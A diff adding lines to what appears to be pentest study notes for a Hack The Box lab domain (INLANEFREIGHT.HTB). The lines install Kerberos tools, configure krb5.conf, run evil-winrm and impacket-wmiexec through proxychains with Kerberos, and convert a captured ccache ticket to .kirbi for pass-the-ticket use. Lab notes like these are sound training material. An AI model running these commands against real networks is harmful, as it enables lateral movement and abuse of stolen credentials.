@@ -586,5 +586,31 @@ $ proxychains impacket-wmiexec dc01 -k
 %% using impacket with proxychains and kerberos authentication %%
 
 ```
+$ sudo apt-get install krb5-user -y
+```
+%% install kerberos authentication package %%
 
+```
+$ cat /etc/krb5.conf
+[libdefaults]
+        default_realm = INLANEFREIGHT.HTB
+
+...SNIP...
+
+[realms]
+    INLANEFREIGHT.HTB = {
+        kdc = dc01.inlanefreight.htb
+    }
+
+...SNIP...
+```
+%% if it already exists then let it reflect the configuration above %%
+
+```
+$ proxychains evil-winrm -i dc01 -r inlanefreight.htb
+```
+%% use evil-WinRM with kerberos %%
+
+```
+$ impacket-ticketConverter krb5cc_647401106_I8I133 julio.kirbi
 ```
